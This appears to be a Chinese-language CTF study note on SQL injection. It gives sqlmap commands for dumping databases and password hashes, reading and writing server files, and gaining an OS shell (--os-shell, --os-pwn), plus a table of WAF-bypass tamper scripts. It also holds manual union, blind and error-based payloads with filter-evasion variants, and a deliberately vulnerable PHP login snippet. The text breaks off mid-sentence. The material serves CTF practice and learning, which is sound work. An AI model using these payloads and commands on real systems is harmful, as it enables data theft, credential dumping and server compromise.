# 1.SQLmap 工具的使用

## 1.基本使用：

查数据库

```
python sqlmap.py -u <url>  -dbs
```

查表名：

```
python sqlmap.py -u <url>  -D ctfshow_web -tables
```

查列名：

```
python sqlmap.py -u <url> -D ctfshow_web -T ctfshow_user -columns
```

查flag：

```
python sqlmap.py -u <url> --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C "id,pass,username" -dump
```

### 参数说明：

#### `--method`指定方法

使用`put`方法时，需要加上头部`--headers="Content-Type:text/plain"`

#### `--referer` 指定

指定来源

#### `--cookie`指定

指定cookie,抓包获得

#### `--data`指定提交的数据

#### `--batch`

不询问用户输入，使用默认行为

#### `--safe-url`

设置在测试目标地址前访问的安全链接，有的链接需要鉴权，确定是由安全链接跳转过来的

`--safe-freq` 设置两次注入测试前访问安全链接的次数

#### `--tamper`对数据做修改绕过waf

| all             |                              |                                                              |                                                              |
| --------------- | ---------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 1               | apostrophemask.py            | 用utf8代替引号                                               | ("1 AND '1'='1")  '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'     |
| 2               | base64encode.py              | 用base64编码替换                                             | ("1' AND SLEEP(5)#") 'MScgQU5EIFNMRUVQKDUpIw=='              |
| 3               | multiplespaces.py            | 围绕SQL关键字添加多个空格                                    | ('1 UNION SELECT foobar') '1  UNION   SELECT  foobar'        |
| 4               | space2plus.py                | 用+替换空格                                                  | ('SELECT id FROM users') 'SELECT+id+FROM+users'              |
| 5               | nonrecursivereplacement.py   | 双重查询语句。取代predefined SQL关键字with表示  suitable for替代（例如 .replace（“SELECT”、”")） filters | ('1 UNION SELECT 2--') '1 UNIOUNIONN SELESELECTCT 2--'       |
| 6               | space2randomblank.py         | 代替空格字符（“”）从一个随机的空 白字符可选字符的有效集      | ('SELECT id FROM users') 'SELECT%0Did%0DFROM%0Ausers'        |
| 7               | unionalltounion.py           | 替换UNION ALL SELECT UNION SELECT                            | ('-1 UNION ALL SELECT') '-1 UNION SELECT'                    |
| 8               | securesphere.py              | 追加特制的字符串                                             | ('1 AND 1=1') "1 AND 1=1 and '0having'='0having'"            |
| mssql           |                              |                                                              |                                                              |
| 1               | space2hash.py                | 绕过过滤‘=’ 替换空格字符（”），（’ – ‘） 后跟一个破折号注释，一个随机字符串和一个新行（’ n’） | '1 AND 9227=9227'  '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227' |
| 2               | equaltolike.py               | like 代替等号                                                | * Input: SELECT * FROM users WHERE id=1  2 * Output: SELECT * FROM users WHERE id LIKE 1 |
| 3               | space2mssqlblank.py(mssql)   | 空格替换为其它空符号                                         | Input: SELECT id FROM users Output: SELECT%08id%02FROM%0Fusers |
| 4               | space2mssqlhash.py           | 替换空格                                                     | ('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227'              |
| 5               | between.py                   | 用between替换大于号（>）                                     | ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--'            |
| 6               | percentage.py                | asp允许每个字符前面添加一个%号                               | * Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E |
| 7               | sp_password.py               | 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾     | ('1 AND 9227=9227-- ') '1 AND 9227=9227-- sp_password'       |
| 8               | charencode.py                | url编码                                                      | * Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45 |
| 9               | randomcase.py                | 随机大小写                                                   | * Input: INSERT * Output: InsERt                             |
| 10              | charunicodeencode.py         | 字符串 unicode 编码                                          | * Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′ |
| 11              | space2comment.py             | Replaces space character (‘ ‘) with comments ‘/**/’          | * Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users |
| mysql >= 5.1.13 |                              |                                                              |                                                              |
| 1               | equaltolike.py               | like 代替等号                                                | \* Input: SELECT * FROM users WHERE id=1 <br/>2 * Output: SELECT * FROM users WHERE id LIKE 1 |
| 2               | greatest.py                  | 绕过过滤’>’ ,用GREATEST替换大于号。                          | ('1 AND A > B') '1 AND GREATEST(A,B+1)=A'                    |
| 3               | apostrophenullencode.py      | 绕过过滤双引号，替换字符和双引号。                           | tamper("1 AND '1'='1")  '1 AND %00%271%00%27=%00%271'        |
| 4               | ifnull2ifisnull.py           | 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ | ('IFNULL(1, 2)') 'IF(ISNULL(1),2,1)'                         |
| 5               | space2mssqlhash.py           | 替换空格                                                     | ('1 AND 9227=9227') '1%23%0AAND%23%0A9227=9227'              |
| 6               | modsecurityversioned.py      | 过滤空格，包含完整的查询版本注释                             | ('1 AND 2>1--') '1 /*!30874AND 2>1*/--'                      |
| 7               | space2mysqlblank.py          | 空格替换其它空白符号(mysql)                                  | Input: SELECT id FROM users Output: SELECT%0Bid%0BFROM%A0users |
| 8               | between.py                   | 用between替换大于号（>）                                     | ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--'            |
| 9               | modsecurityzeroversioned.py  | 包含了完整的查询与零版本注释                                 | ('1 AND 2>1--') '1 /*!00000AND 2>1*/--'                      |
| 10              | space2mysqldash.py           | 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） | ('1 AND 9227=9227') '1--%0AAND--%0A9227=9227'                |
| 11              | bluecoat.py                  | 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like | ('SELECT id FROM users where id = 1') 'SELECT%09id FROM users where id LIKE 1' |
| 12              | percentage.py                | asp允许每个字符前面添加一个%号                               | * Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E |
| 13              | charencode.py                | url编码                                                      | * Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45 |
| 14              | randomcase.py                | 随机大小写                                                   | * Input: INSERT * Output: InsERt                             |
| 15              | versionedkeywords.py         | Encloses each non-function keyword with versioned MySQL comment | * Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# * Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))# |
| 16              | space2comment.py             | Replaces space character (‘ ‘) with comments ‘/**/’          | * Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users |
| 17              | charunicodeencode.py         | 字符串 unicode 编码                                          | * Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′ |
| 18              | versionedmorekeywords.py     | 注释绕过                                                     | * Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# * Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))# |
| MySQL < 5.1     |                              |                                                              |                                                              |
| 19              | halfversionedmorekeywords.py | 关键字前加注释                                               | * Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa * Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa |
| 20              | halfversionedmorekeywords.py | 当数据库为mysql时绕过防火墙，每个关键字之前添加 mysql版本评论 | 1.("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa") 2."value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa" |
| MySQL >= 5.1.13 |                              |                                                              |                                                              |
| 21              | space2morehash.py            | 空格替换为 #号 以及更多随机字符串 换行符                     | * Input: 1 AND 9227=9227 * Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 |
| Oracle          |                              |                                                              |                                                              |
| 1               | greatest.py                  | 绕过过滤’>’ ,用GREATEST替换大于号。                          | ('1 AND A > B') '1 AND GREATEST(A,B+1)=A'                    |
| 2               | apostrophenullencode.py      | 绕过过滤双引号，替换字符和双引号。                           | tamper("1 AND '1'='1")  '1 AND %00%271%00%27=%00%271'        |
| 3               | between.py                   | 用between替换大于号（>）                                     | ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--'            |
| 4               | charencode.py                | url编码                                                      | * Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45 |
| 5               | randomcase.py                | 随机大小写                                                   | * Input: INSERT * Output: InsERt                             |
| 6               | charunicodeencode.py         | 字符串 unicode 编码                                          | * Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′ |
| 7               | space2comment.py             | Replaces space character (‘ ‘) with comments ‘/**/’          | * Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users |
| PostgreSQL      |                              |                                                              |                                                              |
| 1               | greatest.py                  | 绕过过滤’>’ ,用GREATEST替换大于号。                          | ('1 AND A > B') '1 AND GREATEST(A,B+1)=A'                    |
| 2               | apostrophenullencode.py      | 绕过过滤双引号，替换字符和双引号。                           | tamper("1 AND '1'='1")  '1 AND %00%271%00%27=%00%271'        |
| 3               | between.py                   | 用between替换大于号（>）                                     | ('1 AND A > B--') '1 AND A NOT BETWEEN 0 AND B--'            |
| 4               | percentage.py                | asp允许每个字符前面添加一个%号                               | * Input: SELECT FIELD FROM TABLE * Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E |
| 5               | charencode.py                | url编码                                                      | * Input: SELECT FIELD FROM%20TABLE * Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45 |
| 6               | randomcase.py                | 随机大小写                                                   | * Input: INSERT * Output: InsERt                             |
| 7               | charunicodeencode.py         | 字符串 unicode 编码                                          | * Input: SELECT FIELD%20FROM TABLE * Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′ |
| 8               | space2comment.py             | Replaces space character (‘ ‘) with comments ‘/**/’          | * Input: SELECT id FROM users * Output: SELECT//id//FROM/**/users |
| Access          |                              |                                                              |                                                              |
| 1               | appendnullbyte.py            | 在有效负荷结束位置加载零字节字符编码                         | ('1 AND 1=1') '1 AND 1=1%00'                                 |
| 其他            |                              |                                                              |                                                              |
|                 | chardoubleencode.py          | 双url编码(不处理以编码的)                                    | * Input: SELECT FIELD FROM%20TABLE * Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545 |
|                 | unmagicquotes.py             | 宽字符绕过 GPC addslashes                                    | * Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%20            |
|                 | randomcomments.py            | 用/**/分割sql关键字                                          | ‘INSERT’ becomes ‘IN//S//ERT’                                |

sqlmap中的`select`都是大写,对小写进行过滤时可以忽略

#### `--os-shell`

–os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；
 不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限

![image-20240919171716299](./SQL注入/image-20240919171716299.png)

tmpbgxla.php用户命令执行

tmpumore.php用户文件上传

#### `--technique`不同方法注入

```
B: Boolean-based blind 基于布尔的忙逐步

E:Error-based 报错注入

U：Union query-based Union查询注入

S:Stacked queries 堆叠注入

T：Time-based blind 基于时间的盲注

Q：lnline queries 内联查询注入
```

例如：

sqlmap -u “存在注入点的URL" --technique B --current-db #利用基于布尔的盲注对注入点进行SQL注入探测。

**1、sqlmap设置时间盲注延迟时间**
例如： sqlmap -u "存在注入点的URL" --time-sec 3 --current-db

**2、sqlmap设置UNION字段数**
sqlmap -u “存在注入的URL" --union-cols 12-18 --current-db

**3、sqlmap设置union查询表**
sqlmap -u “存在注入的URL" --technique u --union-form users --current-db -v3

**4、sqlmap设置DNS攻击**
定义：通过设置DNS流量来突破限制 --dns-domain "dns服务器" 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得web应用程序中数据内容。

**5、sqlmap设置二次注入**
sqlmap中可以设置二次注入的结果页面

sqlmap -u "存在注入的URL" --second-order

**6、sqlmap识别指纹**
sqlmap -u "存在注入的URL" --fingerprint -f

探测目标指纹信息（--fingerprint -f)

**7、sqlmap检索DBMS Banner**
获取后端数据库Banner信息 --banner 或者 -b

**8、sqlmap检索DBMS当前用户**
获取DBMS当前用户 --current-user

**9、sqlmap检索DBMS当前数据库**
获取当前数据库名 --current-db

**10、sqlmap检索DBMS当前 主机名**
--hostname

**11、sqlmap探测当前用户DBA**
--is-dba 探测当前用户是否是数据库管理员

**12、sqlmap 枚举DBMS用户名**
--user 获取DBMS所有用户

**13、sqlmap枚举DBMS的用户名密码**
--password 获取用户名密码

mysql -h IP地址 -u root -p #MySQL数据库登录

**14、sqlmap枚举DBMS权限**
--privileges--role（角色）

例如：sqlmap -u "存在注入的URL" --technique -u -v3 --batch --privileges

**15、sqlmap列举数据库名**
--dbs 列举数据库名称

**16、sqlmap枚举数据库表**
--tables 枚举表名 --> 制定具体数据库 -D 数据库名

--exclude-sysdbs

例如：(1)sqlmap -u "存在注入的URL" -D 数据库名 --tables

(2)sqlmap -u "存在注入的URL" --tables --exclude-sysdbs

**17、sqlmap枚举数据表列**
--columns -D 指定数据库 -T 指定数据表 -C 指定具体字段

例如：sqlmap -u "存在注入的URL地址" -D 数据库名 -T 用户名 --columns

**18、sqlmap枚举数据值**
--dump

例如：sqlmap -u "存在注入的URL地址" -D 数据库名 -T 表名 -C “username，password" --dump

**19、sqlmap枚举schema信息**
定义：用户可以使用此开关--schema检索DBMS模式。模式列表将所有的数据库、表和列，以及它们各自的类型。与--exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分

例如：sqlmap -u "存在注入的URL地址" --schema--batch --exclude-sysdbs

**20、sqlmap检索数据表的数量**
如果用户只想知道表中的条目数，则可以使用此开关。

--count

### 常用参数

```
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
有时候使用 --passwords 不能获取到密码，则可以试下
-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql 
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #清空会话，重构注入 
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数

```



## 2.get提交：



查数据库：

```
python sqlmap.py -u <url>  -dbs
```

查表名：

```
python sqlmap.py -u <url>  -D ctfshow_web -tables
```

查列名：

```
python sqlmap.py -u <url>  -D ctfshow_web -T ctfshow_user -columns
```

查flag：

```
python sqlmap.py -u <url>  -D ctfshow_web -T ctfshow_user -C "id,pass,username" -dump
```

## 3.post

使用post方式进行注入，可以直接用`--data="id=1"`，也可以`--method=post`来触发

查数据库：

```
python sqlmap.py -u <url> --data="id=1" -dbs
```

查表名：

```
python sqlmap.py -u <url> --data="id=1" -D ctfshow_web -tables
```

查列名：

```
python sqlmap.py -u <url>  -D ctfshow_web -T ctfshow_user -columns
```

查flag：

```
python sqlmap.py -u <url>  -D ctfshow_web -T ctfshow_user -C "id,password" --dump
```



# 2.sql 基本操作

1.判断是字符型还是数字型，使用 2-1 来判断

```
判断是数字型还是字符型：通过?id=1 and 1=2判断，如果显示不正常，说明是数字型，如果显示正常，就是字符串型，就需要进行下面的步骤继续判断。
判断是什么符号的字符型：
单引号测试：通过?id=1'观察回显
双引号测试：通过?id=1"观察回显
判断出字符型：如果哪个符号回显是报错信息，则表示是哪个符号的字符型，接着使用对应符号闭合之后进行SQL注入即可
```

2.如果是字符型，判断闭合方式，' " ')  ")

```
最终结论：如果我们在确定这是字符型注入的时候，使用双引号如果引发了报错，说明就是双引号的字符型。

假设是双引号闭合，多了一个双引号就会报错
sql语句：select * from cms where id = "33"";
```

3.判断查询列数，order by, group by



4.查询回显位置 -1' union select 1,2,3 --+

## 1.union 注入

查询表名

```
2' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

查询列名

```
2' union select 1,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user2' --+
```

查询内容

```
2' union select 1,group_concat(id,username,password) from ctfshow_user2 --+
```

## 2.盲注

### sql 内置函数

%在 sql 中统配 N 个字符

_: 统配一个字符

like……%进行模糊匹配

regexp 进行正则匹配

```
正则表达式匹配的字符类
.：匹配任意单个字符。
^：匹配字符串的开始。
$：匹配字符串的结束。
*：匹配零个或多个前面的元素。
+：匹配一个或多个前面的元素。
?：匹配零个或一个前面的元素。
[abc]：匹配字符集中的任意一个字符。
[^abc]：匹配除了字符集中的任意一个字符以外的字符。
[a-z]：匹配范围内的任意一个小写字母。
[0-9]：匹配一个数字字符。
\w：匹配一个字母数字字符（包括下划线）。
\s：匹配一个空白字符。
```



HAVING 子句允许指定条件来过滤将出现在最终结果中的分组结果。

WHERE 子句在所选列上设置条件，而 HAVING 子句则在由 GROUP BY 子句创建的分组上设置条件。

where 被过滤时还可以使用 right/left/inner join 



盲注时数字被过滤，在 js 中数字几就是几个 true

```
def createNum(n):
    num = 'true'
    if n == 1:
        return 'true'
    else:
        for i in range(n - 1):
            num += "+true"
    return num
   
```



BENCHMARK 函数 用来测试数据库中特定表达式的执行时间，

BENCHMARK(loop_count, expr)，其中 loop_count 是循环次数，expr 是要循环的表达式。

### 布尔盲注

**概念：符合条件返回真值，不符合条件返回假值，利用二分法找到每个字母的 ascii 码值**

**统一 payload**：

```
?id=-1' and ascii(substr(‘abcd’,1,1))>100 --+
```

将 abcd 换为想要查询的语句即可，<font color=red> ascii 被过滤时使用 ord; substr 被过滤时使用 mid, left, right; 空格过滤可以使用`</font >

```
?id=-1' and ord(substr(‘abcd’,1,1))>100 --+
```



**查询库名:**

```
?id=-1' and ascii(substr((select database()),1,1))>100 --+
```

这段语句的意思是查询数据库名第一个字母的 ascii 码是否大于 100



**查询表名：**

```
?id=-1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+
```

limit 0,1 是从第零行开始查询 1 行



查询列名：

```
?id=-1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1),1,1))>100 --+
```

### 3.时间盲注



## 3.报错注入

### extractvalue 报错

```
?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+
```

```sql
?id=100' union 1=extractvalue(1,concat(0x7e,(select database()))),3 --+
```

默认只能返回 32 个字符，使用 substring 解决这个问题，返回第 25 个字符再往后显示 30 个字符

```
?id=100' union 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,'~',password),25,30)from users))) --+ 
```

### floor 报错

concat_ws 作用是连接

使用 group_concat 无法显示可以使用 concat

```
?id=0' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))as a from information_schema.tables group by a --+
```

```
?id=0' union select 1,count(*),concat_ws('-',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),floor(rand(0)*2)) as a information_schema.tables group by a --+
```

```
?id=0' union select 1,count(*),concat_ws('-',(select group_concat(username,':','password')from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+
```

```
?id=0' union select 1,count(*),concat_ws('-',(select concat(username,':','password')from users),floor(rand(0)*2)) as a from information_schema.tables group by a--+
```



## 4.堆叠注入

堆叠注入的原理就是将多条语句堆叠在一起进行执行

```
 select * from users;show databases; 
```



# 2.过滤

## 1.对数字输入有过滤

<font color=red> select 1,2,3 也可以是 select 'a','b','c'</font>

查询表名

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from information_schema.tables where table_schema=database()--+
```

查询列名

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(column_name),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from information_schema.columns where table_name='ctfshow_user4'--+
```

查询内容

```
1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(password),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','L'),'7','Q'),'8','H'),'9','I'),'0','J') from ctfshow_user4--+
```

## 2.union select 过滤

大小写绕过：Union Select

## 3.空格过滤

1.空格过滤使用括号绕过或者

%20 %09 %0a %0b %0c %0d %0e %0f %a0 %00 /**/ /\*\!\*/

  

### **%09 绕过**

```
1'%09union%09select%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()%23
```

```
1'%09union%09select%091,2,group_concat(column_name)%09from%09information_schema.columns%09where%09table_name='ctfshow_user'%23
```

```
1'%09union%09select%091,2,group_concat(id,username,password)%09from%09ctfshow_user%23
```

### **%20 绕过**

```
1'%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23
```

```
1'%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='ctfshow_user'%23
```

```
1'%20union%20select%201,2,group_concat(id,username,password)%20from%20ctfshow_user%23
```

### /**/绕过

```
1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23
```

```
1'/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_user'%23
```

```
1'/**/union/**/select/**/1,2,group_concat(id,username,password)/**/from/**/ctfshow_user%23
```

### %0c 绕过

```
1'%0cunion%0cselect%0c1,2,group_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database()%23
```

```
1'%0cunion%0cselect%0c1,2,group_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name='ctfshow_user'%23
```

```
1'%0cunion%0cselect%0c1,2,group_concat(id,username,password)%0cfrom%0cctfshow_user%23
```



## 4.--+过滤

使用#

或者%23

或者--%20(--加空格绕过，空格可以用%0c,%09……)

## 5.and 和 or

and 的优先级高于 or

```
select id,username,password from ctfshow_user where username != 'flag' and id = '0'or(id=26)and'1' limit 1;

select id,username,password from ctfshow_user where username != 'flag' and id = '0'or(id=26)and'1' limit 1;
```

## 6.md5($str, true)类型绕过

源码：

```php
<?php
        $flag="";
		$password=$_POST['password'];
		if(strlen($password)>10){
			die("password error");
		}
		$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
		$result=mysqli_query($con,$sql);
			if(mysqli_num_rows($result)>0){
					while($row=mysqli_fetch_assoc($result)){
						 echo "登陆成功<br>";
						 echo $flag;
					 }
			}
    ?>


```

在 mysql 里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password =‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password =‘xxx’ or 1 ，也就相当于 password =‘xxx’ or true，所以返回值就是 true。

想办法将内容转换为

```
